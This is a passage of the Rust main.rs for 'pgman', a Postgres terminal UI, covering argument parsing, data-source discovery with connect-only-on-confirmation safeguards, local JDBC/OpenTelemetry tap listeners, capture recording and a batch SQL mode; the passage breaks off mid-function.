//! pgman binary entry point — argument parsing, logging, then the TUI.

use clap::Parser;
use pgman::app::{AppMsg, DataSourcePick};
use pgman::{app, batch, conn, creds, font_probe, project, safety, tap, theme, tui, upgrade, util};
use std::io::IsTerminal;

/// Full flag documentation lives in `docs/commands.md` — the doc
/// comments here are what `--help` shows, so they stay to one short,
/// type-free sentence each.
#[derive(Parser, Default)]
#[command(
    name = "pgman",
    version = concat!(env!("CARGO_PKG_VERSION"), " · beta"),
    about = "k9s-style Postgres TUI for Java/AWS shops (public beta)"
)]
struct Cli {
    /// Connect using a postgres:// DSN — same as --dsn.
    #[arg(value_name = "DSN")]
    dsn_pos: Option<String>,

    /// Connect using a postgres:// DSN.
    #[arg(long, value_name = "DSN")]
    dsn: Option<String>,

    /// Colour theme: dark | light | high-contrast.
    #[arg(long, default_value = "dark")]
    theme: String,

    /// Upgrade this install (checkout, cargo or Homebrew) and exit; a
    /// standalone binary is pointed at the releases page.
    #[arg(long)]
    upgrade: bool,

    /// Skip the startup check for a newer pgman release on crates.io.
    #[arg(long)]
    no_update_check: bool,

    /// Run against a synthetic dataset — no database, network, or disk writes.
    #[arg(long)]
    demo: bool,

    /// Write a commented default safety.toml under the config dir, then exit.
    #[arg(long)]
    init_config: bool,

    /// Preload the editor with a Hibernate or Postgres log from PATH
    /// (`-` for stdin) and reconstruct it into the query picker.
    #[arg(long, value_name = "PATH")]
    log: Option<std::path::PathBuf>,

    /// Run a SQL statement and write the result to stdout, then exit. No TUI.
    #[arg(long, help_heading = "Batch mode")]
    batch: bool,

    /// The statement to run in --batch mode; omit to read stdin until EOF.
    #[arg(long, help_heading = "Batch mode")]
    sql: Option<String>,

    /// --batch output format: csv (default) | tsv | json | expanded.
    #[arg(long, default_value = "csv", help_heading = "Batch mode")]
    format: String,

    /// In --batch, proceed past guarded writes needing confirmation;
    /// blocked statements and read-only stay refused either way.
    #[arg(long, help_heading = "Batch mode")]
    yes: bool,

    /// In --batch with no --dsn, accept the single data source
    /// discovered in this checkout. Without it a discovered candidate
    /// is refused: nothing found in the working tree connects without
    /// a deliberate act, and --batch has no keypress to offer.
    #[arg(long, help_heading = "Batch mode")]
    discovered: bool,

    /// Bind a TCP listener for the pgman-tap JAR (length-prefixed JSON events).
    #[arg(long, value_name = "ADDR", help_heading = "JDBC tap")]
    tap_listen: Option<String>,

    /// Bind an OTLP/HTTP listener so any OpenTelemetry JVM can stream
    /// Postgres spans in, no pgman-tap JAR needed.
    #[arg(long, value_name = "ADDR", help_heading = "JDBC tap")]
    tap_otlp: Option<String>,

    /// Replay a captured tap event stream (JSONL) through the live pipeline.
    #[arg(long, value_name = "PATH", help_heading = "JDBC tap")]
    tap_replay: Option<std::path::PathBuf>,

    /// Bind a UDP listener for fire-and-forget tap events (lossy, unframed).
    #[arg(long, value_name = "ADDR", help_heading = "JDBC tap")]
    tap_udp: Option<String>,

    /// Append every incoming tap event to PATH as JSONL, for later --tap-replay.
    #[arg(long, value_name = "PATH", help_heading = "JDBC tap")]
    tap_record: Option<std::path::PathBuf>,

    /// Don't auto-enable the tap listener in a Java project (pom.xml /
    /// build.gradle in the launch directory). An explicit --tap-listen
    /// still binds.
    #[arg(long, help_heading = "JDBC tap", conflicts_with = "tap_listen")]
    no_tap: bool,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();

    // `--upgrade` is the only flag that doesn't enter the TUI. Handle it
    // before we set up logging / probe the terminal.
    if cli.upgrade {
        return upgrade::run();
    }

    // `--init-config` is a one-shot file write, not a TUI path either.
    if cli.init_config {
        std::process::exit(init_config_cli());
    }

    // `--batch` is the other non-TUI path. Don't init the rolling-file
    // logger either — keep tracing quiet so script output isn't
    // polluted; errors go to stderr in run().
    if cli.batch {
        let code = run_batch(&cli).await;
        std::process::exit(code);
    }

    // `--log`'s size ceiling is a plain argument-validation error —
    // independent of whether a terminal is attached — so it's checked
    // ahead of the terminal probe below rather than deep in the
    // preload path where it used to live. Skipped under `--demo`,
    // which never reads `--log` at all (same as before this change).
    if !cli.demo {
        if let Some(path) = cli.log.as_deref() {
            if let Err(msg) = check_log_max_size(path) {
                eprintln!("--log: {msg}");
                std::process::exit(2);
            }
        }
    }

    // Every remaining path enters the alternate screen (--demo included).
    // A launch with no terminal on either end used to die with a raw
    // `Error: Device not configured (os error 6)` from inside crossterm —
    // point at `--batch` instead, before anything touches the terminal.
    if !(std::io::stdin().is_terminal() && std::io::stdout().is_terminal()) {
        eprintln!("pgman needs a terminal. For pipes and scripts use --batch (see pgman --help).");
        std::process::exit(2);
    }

    init_logging();
    tracing::info!("pgman {} starting", env!("CARGO_PKG_VERSION"));

    // Probe the terminal font *before* entering the alternate screen.
    let icons = font_probe::resolve_icons_setting("auto");
    let (mut theme, theme_warn) = theme::Theme::resolve(&cli.theme);
    theme.icons = match icons.as_str() {
        "powerline" => theme::IconStyle::Powerline,
        "ascii" => theme::IconStyle::Ascii,
        _ => theme::IconStyle::Unicode,
    };
    if let Some(w) = theme_warn {
        tracing::warn!("{w}");
    }

    // `--demo`: synthetic, self-contained app — no discovery, no
    // connection, no tap listeners, no draft/history restore. Bypass
    // all of that and run the fixture app straight into the TUI.
    if cli.demo {
        tracing::info!("starting in --demo mode (synthetic data, no database)");
        let mut application = pgman::demo::launch_app(theme);
        let mut term = tui::Tui::enter()?;
        let result = application.run(&mut term).await;
        drop(term);
        return result;
    }

    let dsn_arg = match resolve_dsn_arg(&cli) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("{e}");
            std::process::exit(2);
        }
    };
    let dsn = match dsn_arg.as_deref() {
        Some(raw) => match conn::Dsn::parse(raw) {
            Ok(mut d) => {
                apply_pgpassword(&mut d);
                Some(d)
            }
            Err(e) => {
                eprintln!("invalid --dsn: {e}");
                std::process::exit(2);
            }
        },
        None => None,
    };
    let dsn_origin: Option<String> = if dsn_arg.is_some() {
        Some("--dsn flag".to_string())
    } else {
        None
    };

    // Discover data sources from the surrounding project. The project file
    // (`.pgman/pgman.toml`, intended for git) takes precedence; IntelliJ's
    // `.idea/dataSources.xml` supplements it. Spring/yaml is a follow-up.
    // When the operator passed `--dsn`, discovery still runs (for logging
    // and to keep the picker available on connection failure) but doesn't
    // override the explicit choice.
    let mut data_source_picks: Vec<DataSourcePick> = Vec::new();
    let mut project_safety: Option<project::ProjectSafety> = None;
    // Tracks whether we saw a Spring / Java project in the cwd —
    // used to auto-enable the tap-tcp listener so the operator
    // doesn't have to remember `--tap-listen`. Explicit flags
    // still win (they make the bound port visible).
    let mut java_project_detected = false;
    if let Ok(cwd) = std::env::current_dir() {
        if let Some((root, project_cfg)) = project::load_from(&cwd) {
            tracing::info!("project root: {}", root.display());
            project_safety = project_cfg.safety;
            for c in &project_cfg.connections {
                match project_connection_pick(c) {
                    Some(pick) => {
                        tracing::info!(
                            "  project connection '{}' → {}",
                            pick.name,
                            pick.dsn
                                .as_ref()
                                .map(|d| d.redacted())
                                .unwrap_or_else(|| conn::redact_url(&c.url))
                        );
                        data_source_picks.push(pick);
                    }
                    None => tracing::warn!(
                        "  project connection '{}' has unparseable url '{}'; skipping",
                        c.name,
                        conn::redact_url(&c.url)
                    ),
                }
            }
        }
        if creds::spring::detect_java_project(&cwd) {
            tracing::info!("Java project detected at {}", cwd.display());
            java_project_detected = true;
            discover_spring_datasources(&cwd, &mut data_source_picks);
        }
        if creds::intellij::detect_intellij_project(&cwd) {
            discover_intellij_datasources(&cwd, &mut data_source_picks);
        }
    }

    // NO auto-connect from discovery. Everything in `data_source_picks`
    // came out of the working tree — `.pgman/pgman.toml`,
    // `application*.yml`, `.idea/dataSources.xml` — so a checkout the
    // operator didn't write chooses the host. pgman used to connect
    // straight to a lone candidate, which meant `git clone && cd && pgman`
    // opened a connection to a host the repo author picked. Now a
    // discovered pick always waits for a keypress in `Mode::ConnPick`
    // (see `App::new`), however many there are. `--dsn` is the operator's
    // own and still connects immediately.
    if dsn.is_none() && !data_source_picks.is_empty() {
        tracing::info!(
            "{} discovered data source(s); waiting for the operator to choose one",
            data_source_picks.len()
        );
    }

    let safety_config = project::merge_safety(load_safety_config(), project_safety.as_ref());
    let mut application = app::App::new(theme, dsn, data_source_picks, safety_config);
    application.dsn_origin = dsn_origin;
    // Update check: opt-out via --no-update-check or the env var.
    // (--demo and --batch never reach here — --demo builds its own
    // App with the check disabled, --batch exits before the TUI.)
    application.update_check_enabled =
        !cli.no_update_check && std::env::var_os("PGMAN_NO_UPDATE_CHECK").is_none();
    // Restore the editor draft from the last session (best-effort).
    // Cursor lands at the end so the operator can keep typing.
    if let Some(draft) = app::load_draft() {
        application.editor.cursor = draft.len();
        application.editor.buffer = draft;
    }
    // `--log PATH`: preload the editor with a log and run the same
    // importer F8 / ctrl-l use, so pgman opens straight into the
    // reconstructed-query picker (`Mode::LogPick`) once the splash
    // clears. Reconstruction needs no database, so this runs regardless
    // of whether the connection (if any) has resolved yet — and
    // overrides the just-restored draft above, since an explicit --log
    // is a stronger signal of intent than a leftover editor session.
    if let Some(path) = cli.log.as_ref() {
        match read_log_source(path) {
            Ok(text) => application.preload_log(text),
            Err(e) => {
                eprintln!("--log {}: {e}", path.display());
                std::process::exit(2);
            }
        }
    }
    // Restore query history (Ctrl-R, Ctrl-P/N) from the last session.
    // Best-effort: a missing or unreadable file means we start with
    // no history.
    application.history = app::load_history();
    application.saved_queries = pgman::saved::load_from(&app::saved_queries_path());

    // JDBC tap listeners — spawned before the TUI loop so
    // events start flowing as soon as the JAR / OTel agent
    // connects. Listener failures are surfaced as startup
    // warnings but don't block the TUI: pgman is still useful
    // as a DB-side tool when the tap is unavailable.
    //
    // Auto-enable rule: when we detected a Java project in the
    // cwd AND the operator didn't pass --tap-listen, bind
    // 127.0.0.1:7432 by default. Explicit `--tap-listen` (any
    // value) wins. OTLP stays opt-in via `--tap-otlp` because
    // its port (4318) collides with the standard OTel
    // collector, so we don't surprise-bind it. The startup log
    // is explicit about what got auto-enabled.
    let tap_listen_effective: Option<String> = cli.tap_listen.clone().or_else(|| {
        if java_project_detected && !cli.no_tap {
            tracing::info!(
                "tap: Java project detected — auto-enabling --tap-listen :7432 (--no-tap to disable, --tap-listen to override)"
            );
            Some(":7432".into())
        } else if java_project_detected {
            tracing::info!("tap: Java project detected, --no-tap given — no listener");
            None
        } else {
            None
        }
    });
    // Auto-enabled, as opposed to asked for: the operator is told on the
    // status line. An ingest port they did not ask for — loopback, but
    // open — is not something the log alone should carry.
    let tap_auto_enabled = cli.tap_listen.is_none() && tap_listen_effective.is_some();
    //
    // Both --tap-listen and --tap-otlp share one adapter task
    // that translates `tap::TapEvent` → `AppMsg::TapEvent`
    // so the tap module stays App-agnostic.
    // --tap-record alone wouldn't see any events (it sits on
    // the adapter, which only gets fed from a transport).
    // Surface that as a startup warning so the operator
    // notices missing data immediately, not later.
    if cli.tap_record.is_some()
        && tap_listen_effective.is_none()
        && cli.tap_otlp.is_none()
        && cli.tap_replay.is_none()
        && cli.tap_udp.is_none()
    {
        eprintln!(
            "warning: --tap-record set but no tap transport active — \
             nothing will be written. Pass --tap-listen / --tap-otlp / \
             --tap-udp / --tap-replay."
        );
    }
    let needs_tap_adapter = tap_listen_effective.is_some()
        || cli.tap_otlp.is_some()
        || cli.tap_replay.is_some()
        || cli.tap_udp.is_some();
    let tap_channels = if needs_tap_adapter {
        let app_tx = application.msg_tx_clone();
        // Two bounded channels so replay can't starve the live
        // transports. Live (TCP / UDP / OTLP) listeners share
        // `live_tap_tx` and try_send through forward_or_drop —
        // they drop on full. Replay gets its own channel and
        // uses `.send().await` for delivery guarantee; if it
        // backs up that's fine because it ONLY blocks the
        // replay file pump, not the listeners. The single
        // adapter task selects from both rx.
        let (live_tap_tx, mut live_rx) =
            tokio::sync::mpsc::channel::<tap::TapEvent>(tap::TAP_CHANNEL_CAPACITY);
        let (replay_tap_tx, mut replay_rx) =
            tokio::sync::mpsc::channel::<tap::TapEvent>(tap::TAP_CHANNEL_CAPACITY);
        // Open the capture file once and own it inside the
        // adapter task. The previous version used `std::fs`
        // sync writes + `BufWriter` + per-event flush — those
        // are blocking syscalls on a tokio worker, which under
        // load (slow disk / NFS / 1k QPS JAR) would stall the
        // runtime. Switch to `tokio::fs` so the I/O hops off
        // the worker; still flush per-event so a Ctrl-C
        // doesn't lose the tail. Capture rate is low relative
        // to ring throughput so the per-write overhead is
        // bounded.
        let record_path = cli.tap_record.clone();
        // BufWriter was here previously but per-event flush
        // made it dead weight and risked losing the tail on
        // shutdown — the post-loop final flush isn't reached
        // when the tokio runtime drops the adapter at `.await`.
        // Write directly to the underlying file; the kernel
        // buffers small appends adequately.
        let mut record_file: Option<tokio::fs::File> = match record_path.as_ref() {
            None => None,
            Some(path) => {
                if let Some(parent) = path.parent() {
                    if !parent.as_os_str().is_empty() {
                        // Owner-only (0700) — a tap-record capture
                        // holds production parameter values, so the
                        // directory it lives in must not be
                        // listable by other local users either.
                        let _ = util::create_dir_all_private(parent);
                    }
                }
                let mut open_opts = tokio::fs::OpenOptions::new();
                open_opts.create(true).append(true);
                #[cfg(unix)]
                open_opts.mode(0o600);
                match open_opts.open(path).await {
                    Ok(f) => {
                        // `.mode()` only governs the permissions
                        // used at CREATE time — clamp explicitly so
                        // resuming a capture into a pre-existing
                        // file (e.g. created before this fix, under
                        // a looser umask) still ends up owner-only.
                        #[cfg(unix)]
                        {
                            use std::os::unix::fs::PermissionsExt;
                            let _ = f
                                .set_permissions(std::fs::Permissions::from_mode(0o600))
                                .await;
                        }
                        tracing::info!("tap-record: appending events to {}", path.display());
                        Some(f)
                    }
                    Err(e) => {
                        eprintln!("invalid --tap-record {}: {e}", path.display());
                        std::process::exit(2);
                    }
                }
            }
        };
        // Bytes already in the capture: a resumed capture starts from
        // the file's current size, so `tap::TAP_RECORD_MAX_BYTES` caps
        // the file, not the session.
        let mut record_bytes: u64 = match record_file.as_ref() {
            Some(f) => f.metadata().await.map(|m| m.len()).unwrap_or(0),
            None => 0,
        };
        tokio::spawn(async move {
            use tokio::io::AsyncWriteExt;
            // Track the global drop counter so we can emit a
            // synthetic heartbeat line into the capture
            // whenever events were shed at the listener
            // boundary. Replay against such a file then folds
            // these into tap_health.dropped_events_total —
            // the diagnostic survives the round trip.
            let mut last_drop_seen = tap::dropped_at_listener();
            loop {
                // Select fairly between live and replay
                // sources. When both channels close we exit
                // the loop naturally and the post-loop flush
                // runs.
                let event = tokio::select! {
                    Some(e) = live_rx.recv() => e,
                    Some(e) = replay_rx.recv() => e,
                    else => break,
                };
                // Send to the live App side FIRST so a slow
                // disk on the record path can't starve the
                // TUI. The capture write is best-effort: it
                // happens AFTER the live forward, and a write
                // failure disables the recorder for this
                // session (rather than spamming the log for
                // every subsequent event).
                let app_send = app_tx.send(AppMsg::TapEvent {
                    event: event.clone(),
                });
                if let Some(f) = record_file.as_mut() {
                    // Drop-marker: when the listener has
                    // dropped events since the last write, write
                    // a synthetic heartbeat that carries the
                    // updated cumulative count. Replay folds
                    // this into tap_health on the receiving
                    // pgman so the "X% missing" signal survives
                    // the file round-trip.
                    let cur_drops = tap::dropped_at_listener();
                    // The marker line (if due) and the event line go
                    // out as one write: a panic mid-format can't leave
                    // a torn line, and the size cap is checked once
                    // against the whole of it.
                    let mut bytes: Vec<u8> = Vec::new();
                    if cur_drops > last_drop_seen {
                        let marker = tap::TapEvent {
                            v: 1,
                            kind: tap::TapKind::Heartbeat,
                            ts_unix_micros: event.ts_unix_micros,
                            received_at_unix_micros: 0,
                            app: None,
                            pool: None,
                            conn: None,
                            txn: None,
                            sql: None,
                            params: None,
                            params_redacted: false,
                            duration_micros: None,
                            rows: None,
                            error: None,
                            caller: None,
                            dropped_events_total: Some(cur_drops),
                            txn_outcome: None,
                        };
                        if let Ok(line) = tap::record_line(&marker) {
                            bytes.extend(line.into_bytes());
                            bytes.push(b'\n');
                        }
                        last_drop_seen = cur_drops;
                    }
                    match tap::record_line(&event) {
                        Ok(line) => {
                            bytes.extend(line.into_bytes());
                            bytes.push(b'\n');
                        }
                        Err(e) => tracing::warn!("tap-record: serialize failed: {e}"),
                    }
                    if tap::record_would_exceed(
                        record_bytes,
                        bytes.len(),
                        tap::TAP_RECORD_MAX_BYTES,
                    ) {
                        // Once: the recorder is dropped, so this cannot
                        // repeat. A capture holds production parameter
                        // values; a pgman left running must not write
                        // them without bound.
                        tracing::warn!(
                            "tap-record: {} has reached {} MiB; capture stopped for this session — start a new file to keep recording",
                            record_path
                                .as_ref()
                                .map(|p| p.display().to_string())
                                .unwrap_or_default(),
                            tap::TAP_RECORD_MAX_BYTES / (1024 * 1024)
                        );
                        record_file = None;
                    } else if !bytes.is_empty() {
                        // Write + flush sequentially. A failure disables
                        // the recorder so we don't spam logs every event.
                        let write_ok = match f.write_all(&bytes).await {
                            Ok(()) => true,
                            Err(e) => {
                                tracing::warn!(
                                    "tap-record: write failed; disabling capture for this session: {e}"
                                );
                                false
                            }
                        };
                        if write_ok {
                            record_bytes = record_bytes.saturating_add(bytes.len() as u64);
                            if let Err(e) = f.flush().await {
                                tracing::warn!(
                                    "tap-record: flush failed; disabling capture for this session: {e}"
                                );
                                record_file = None;
                            }
                        } else {
                            record_file = None;
                        }
                    }
                }
                if app_send.is_err() {
                    break; // app has shut down
                }
            }
            // Final flush on shutdown so the tail definitely
            // lands when the loop exits naturally (all senders
            // dropped). Not reached when the tokio runtime
            // cancels the task at the recv().await — but
            // without a BufWriter on top of tokio::fs::File the
            // kernel-side append is durable per-event anyway.
            if let Some(mut f) = record_file.take() {
                let _ = f.flush().await;
            }
        });
        Some((live_tap_tx, replay_tap_tx))
    } else {
        None
    };
    if let Some(addr_raw) = tap_listen_effective.as_deref() {
        match parse_tap_addr(addr_raw) {
            Ok(addr) => {
                let tap_tx = tap_channels
                    .as_ref()
                    .expect("adapter spawned above")
                    .0
                    .clone();
                tokio::spawn(async move {
                    if let Err(e) = tap::run_tcp_listener(addr, tap_tx).await {
                        tracing::error!("tap-tcp listener bind failed: {e}");
                    }
                });
                tracing::info!("tap: listening on {addr} (tcp)");
                if tap_auto_enabled {
                    application.last_status = Some(tap_auto_status_line(&addr));
                }
            }
            Err(e) => {
                eprintln!("invalid --tap-listen {addr_raw:?}: {e}");
                std::process::exit(2);
            }
        }
    }
    if let Some(addr_raw) = cli.tap_udp.as_deref() {
        match parse_tap_addr(addr_raw) {
            Ok(addr) => {
                let tap_tx = tap_channels
                    .as_ref()
                    .expect("adapter spawned above")
                    .0
                    .clone();
                tokio::spawn(async move {
                    if let Err(e) = tap::run_udp_listener(addr, tap_tx).await {
                        tracing::error!("tap-udp listener bind failed: {e}");
                    }
                });
                tracing::info!("tap: listening on {addr} (udp)");
            }
            Err(e) => {
                eprintln!("invalid --tap-udp {addr_raw:?}: {e}");
                std::process::exit(2);
            }
        }
    }
    if let Some(addr_raw) = cli.tap_otlp.as_deref() {
        match parse_tap_addr(addr_raw) {
            Ok(addr) => {
                let tap_tx = tap_channels
                    .as_ref()
                    .expect("adapter spawned above")
                    .0
                    .clone();
                tokio::spawn(async move {
                    if let Err(e) = tap::run_otlp_listener(addr, tap_tx).await {
                        tracing::error!("tap-otlp listener bind failed: {e}");
                    }
                });
                tracing::info!("tap: OTLP/HTTP listening on {addr}");
            }
            Err(e) => {
                eprintln!("invalid --tap-otlp {addr_raw:?}: {e}");
                std::process::exit(2);
            }
        }
    }
    if let Some(path) = cli.tap_replay.clone() {
        // Replay uses its own channel so backpressure on the
        // replay file pump can't starve live transports.
        let replay_tx = tap_channels
            .as_ref()
            .expect("adapter spawned above")
            .1
            .clone();
        tokio::spawn(async move {
            match tap::run_replay_file(&path, replay_tx).await {
                Ok(n) => {
                    tracing::info!("tap-replay: streamed {n} event(s) from {}", path.display())
                }
                Err(e) => tracing::error!("tap-replay: failed to read {}: {e}", path.display()),
            }
        });
    }
    // Drop both keepalive senders so the adapter's select
    // exits cleanly when all listeners + the replay task have
    // shut down on app exit.
    drop(tap_channels);

    let mut term = tui::Tui::enter()?;
    let result = application.run(&mut term).await;
    drop(term); // restore the terminal before surfacing any error
    result
}

/// The status line shown when the tap listener was bound without being
/// asked for. Pure so the wording is pinned: the port, why it is open,
/// and the flag that stops it.
fn tap_auto_status_line(addr: &std::net::SocketAddr) -> String {
    format!("tap listener on {addr} (auto: Java project detected) · --no-tap to disable")
}

/// Parse the `--tap-listen` value. Accepts `host:port`, `:port`
/// (binds 127.0.0.1 by default — local-only, since the wire
/// shape doesn't yet authenticate), or bare `port`. Returns a
/// useful error message on parse failure so the operator sees
/// what went wrong without grepping logs.
fn parse_tap_addr(raw: &str) -> Result<std::net::SocketAddr, String> {
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};
    let raw = raw.trim();
    if let Some(rest) = raw.strip_prefix(':') {
        let port: u16 = rest.parse().map_err(|e| format!("port {rest:?}: {e}"))?;
        return Ok(SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), port));
    }
    if !raw.contains(':') {
        // Bare port — same shape, default to localhost.
        let port: u16 = raw.parse().map_err(|e| format!("port {raw:?}: {e}"))?;
        return Ok(SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), port));
    }
    raw.parse::<SocketAddr>()
        .map_err(|e| format!("expected host:port or :port, got {raw:?}: {e}"))
}

/// Send `tracing` output to `~/.cache/pgman/pgman.log`. Level via `RUST_LOG`,
/// defaulting to `info`.
/// Resolve a DSN for `--batch` from `--dsn` first, then a single
/// project-config / IntelliJ / Spring pick. Multiple candidates fail
/// fast — batch mode can't prompt — so the operator must disambiguate
/// with `--dsn`.
fn resolve_batch_dsn(cli: &Cli) -> Result<conn::Dsn, String> {
    if let Some(raw) = resolve_dsn_arg(cli)? {
        let mut dsn = conn::Dsn::parse(&raw).map_err(|e| format!("invalid --dsn: {e}"))?;
        apply_pgpassword(&mut dsn);
        return Ok(dsn);
    }
    let mut picks: Vec<DataSourcePick> = Vec::new();
    if let Ok(cwd) = std::env::current_dir() {
        if let Some((_, cfg)) = project::load_from(&cwd) {
            for c in &cfg.connections {
                if let Some(pick) = project_connection_pick(c) {
                    picks.push(pick);
                }
            }
        }
        if creds::spring::detect_java_project(&cwd) {
            discover_spring_datasources(&cwd, &mut picks);
        }
        if creds::intellij::detect_intellij_project(&cwd) {
            discover_intellij_datasources(&cwd, &mut picks);
        }
    }
    batch_dsn_from_picks(picks, cli.discovered)
}

/// Reduce the discovered candidate list to the one DSN `--batch` may
/// use, or the reason it may not. Pure — the tree-walking that produced
/// `picks` happens in `resolve_batch_dsn`.
///
/// Batch has no picker and nobody to prompt, so every question the TUI
/// would ask becomes a refusal here rather than a silent yes. That
/// includes the question the TUI asks about discovery itself: "nothing
/// discovered connects without a keypress" (see
/// `docs/safety-and-privacy.md`) — a single candidate lands in the
/// picker exactly like ten. Batch used to connect to a lone candidate
/// on its own, so `git clone && pgman --batch --sql …` inside a
/// checkout the operator hadn't read connected to whatever host that
/// checkout named. `allow_discovered` (the `--discovered` flag) is the
/// deliberate act that replaces the keypress.
fn batch_dsn_from_picks(
    picks: Vec<DataSourcePick>,
    allow_discovered: bool,
) -> Result<conn::Dsn, String> {
    match picks.len() {
        0 => Err(
            "no DSN — pass --dsn or run from a project with .pgman/pgman.toml or .idea/dataSources.xml"
                .into(),
        ),
        1 => {
            let pick = picks.into_iter().next().expect("len checked");
            if !allow_discovered {
                return Err(format!(
                    "'{}' was discovered in this checkout — pgman never connects to a \
                     discovered data source without a deliberate act, and --batch has no \
                     keypress to offer. Pass --dsn to name the connection yourself, or \
                     --discovered to accept this one.",
                    pick.name
                ));
            }
            // An unresolved placeholder must fail loudly rather than
            // handing `connect_and_bootstrap` a literal `${NAME}`.
            if let Some(name) = pick.unresolved_host.first() {
                return Err(format!(
                    "${{{name}}} sits in the host of '{}' — pgman never resolves a \
                     placeholder into a hostname. Put a literal host in .pgman/pgman.toml",
                    pick.name
                ));
            }
            if let Some(name) = pick.unresolved.first() {
                return Err(format!(
                    "unresolved placeholder ${{{name}}} — export it, or put the connection in .pgman/pgman.toml"
                ));
            }
            // Same belt-and-braces the TUI applies, from the same
            // helper, so batch can't accept a DSN the picker refuses.
            if let Some((field, body)) = app::dsn_placeholder_field(pick.dsn.as_ref()) {
                return Err(format!(
                    "${{{body}}} is still a literal placeholder in the {field} of '{}' — \
                     export it, or put the connection in .pgman/pgman.toml",
                    pick.name
                ));
            }
            let dsn = pick.dsn.ok_or_else(|| {
                format!(
                    "'{}' has no usable connection URL — check the discovered config",
                    pick.name
                )
            })?;
            // The TUI asks before spawning `ssh` to a bastion a
            // committed file named (`App::connect_to_discovered_pick`).
            // "Non-interactive" is not a reason to skip the question —
            // so refuse, and point at the one form that is the
            // operator's own choice.
            if let Some(t) = &dsn.ssh_tunnel {
                return Err(format!(
                    "'{}' opens an ssh tunnel to {} — pgman won't spawn ssh for a \
                     discovered connection without confirmation, and --batch can't ask. \
                     Pass --dsn if that's what you want.",
                    pick.name,
                    t.to_display()
                ));
            }
            Ok(dsn)
        }
        n => Err(format!(
            "found {n} candidate data sources — pass --dsn to disambiguate in batch mode"
        )),
    }
}

async fn run_batch(cli: &Cli) -> i32 {
    let dsn = match resolve_batch_dsn(cli) {
        Ok(d) => d,
        Err(e) => {
            // Names a discovered pick — text the checkout wrote.
            eprintln!("{}", batch::terminal_safe(&e));
            return 2;
        }
    };
    let format = match batch::Format::parse(&cli.format) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("{e}");
            return 2;
        }
    };
    let sql = match cli.sql.clone() {
        Some(s) => s,
        None => {
            use std::io::Read;
            let mut buf = String::new();
            if let Err(e) = std::io::stdin().read_to_string(&mut buf) {
                eprintln!("failed to read SQL from stdin: {e}");
                return 2;
            }
            buf
        }
    };
    if sql.trim().is_empty() {
        eprintln!("no SQL provided (pass --sql or pipe via stdin)");
        return 2;
    }
    // Batch runs the same tighten-only project merge the TUI does, so a
    // team's committed `[safety]` block still holds in CI. (Only
    // tightening survives the merge — a project can't hand a CI job a
    // relaxed guard table; see `project::merge_safety`.)
    let safety_cfg = project::merge_safety(
        load_safety_config(),
        std::env::current_dir()
            .ok()
            .and_then(|cwd| load_project_safety(&cwd))
            .as_ref(),
    );
    // Read the profile values out before moving the config into Opts.
    let (read_only, statement_timeout_ms) = {
        let profile = safety_cfg.profile_for(&dsn.dbname);
        (profile.read_only, profile.statement_timeout_ms)
    };
    // Kept for the connect-failure hint below — `opts.dsn` is moved
    // into `batch::run`, which only reports the failure as a String.
    let dsn_for_hint = dsn.clone();
    let opts = batch::Opts {
        db: dsn.dbname.clone(),
        read_only,
        statement_timeout_ms,
        dsn,
        sql,
        format,
        safety: safety_cfg,
        assume_yes: cli.yes,
    };
    match batch::run(opts).await {
        Ok(code) => code,
        Err(e) => {
            // The server's own words, straight to the terminal: filtered
            // like every other server-supplied line batch prints.
            eprintln!(
                "{}",
                batch::terminal_safe(&format_connect_failure(&e, &dsn_for_hint))
            );
            2
        }
    }
}

/// Format a connect failure for stderr: the driver/server message on
/// the first line, then `hint: …` on a second line when
/// `conn::connect_hint` recognises the error text. Pure so it's unit
/// tested without a live (or deliberately broken) connection.
fn format_connect_failure(err: &str, dsn: &conn::Dsn) -> String {
    let mut out = format!("connect failed: {err}");
    if let Some(hint) = conn::connect_hint(err, dsn) {
        out.push('\n');
        out.push_str(&format!("hint: {hint}"));
    }
    out
}

/// Resolve the DSN string from `--dsn` and/or the positional `DSN`
/// argument (`pgman postgres://…`). Errors when both are given and
/// disagree — there's no principled way to pick one; the same value
/// twice (e.g. a script that always passes both) passes through.
fn resolve_dsn_arg(cli: &Cli) -> Result<Option<String>, String> {
    match (&cli.dsn, &cli.dsn_pos) {
        (Some(flag), Some(pos)) if flag != pos => Err(format!(
            "--dsn {flag:?} and the positional DSN {pos:?} disagree — pass only one"
        )),
        (Some(flag), _) => Ok(Some(flag.clone())),
        (None, Some(pos)) => Ok(Some(pos.clone())),
        (None, None) => Ok(None),
    }
}

/// Write a commented default `safety.toml` under the config dir
/// (`--init-config`). Refuses to overwrite an existing file. Returns
/// the process exit code.
fn init_config_cli() -> i32 {
    let path = util::config_file("safety.toml");
    if path.exists() {
        eprintln!(
            "--init-config: {} already exists; refusing to overwrite it",
            path.display()
        );
        return 1;
    }
    match util::write_private(&path, safety::DEFAULT_SAFETY_TOML) {
        Ok(()) => {
            println!("wrote {}", path.display());
            0
        }
        Err(e) => {
            eprintln!("--init-config: could not write {}: {e}", path.display());
            1
        }
    }
}

/// `--log`'s size ceiling — the reconstruction parsers hold the whole
/// file (and their parsed output) in memory, and the editor buffer
/// isn't meant to carry tens of megabytes of raw log text either.
const LOG_MAX_BYTES: u64 = 64 * 1024 * 1024;

/// Refuse a `--log PATH` bigger than [`LOG_MAX_BYTES`] before reading
/// it. `-` (stdin) has no knowable size ahead of reading it, so it's
/// exempt. A `path` that doesn't exist / can't be stat'd is let
/// through here — `read_log_source` produces the real (not-found /
/// permission) error for that case.
fn check_log_max_size(path: &std::path::Path) -> Result<(), String> {
    if path.as_os_str() == "-" {
        return Ok(());
    }
    let Ok(meta) = std::fs::metadata(path) else {
        return Ok(());
    };
    if meta.len() > LOG_MAX_BYTES {
        let mb = meta.len() / (1024 * 1024);
        return Err(format!(
            "{} is {mb} MB; pgman reconstructs logs up to 64 MB — trim it first \
             (grep for org.hibernate.SQL or LOG:)",
            path.display()
        ));
    }
    Ok(())
}

/// Read `--log PATH`'s target: `-` reads stdin to EOF, otherwise the file
/// at `path`.
fn read_log_source(path: &std::path::Path) -> std::io::Result<String> {
    if path.as_os_str() == "-" {
        use std::io::Read;
        let mut buf = String::new();
        std::io::stdin().read_to_string(&mut buf)?;
        Ok(buf)
    } else {
        std::fs::read_to_string(path)
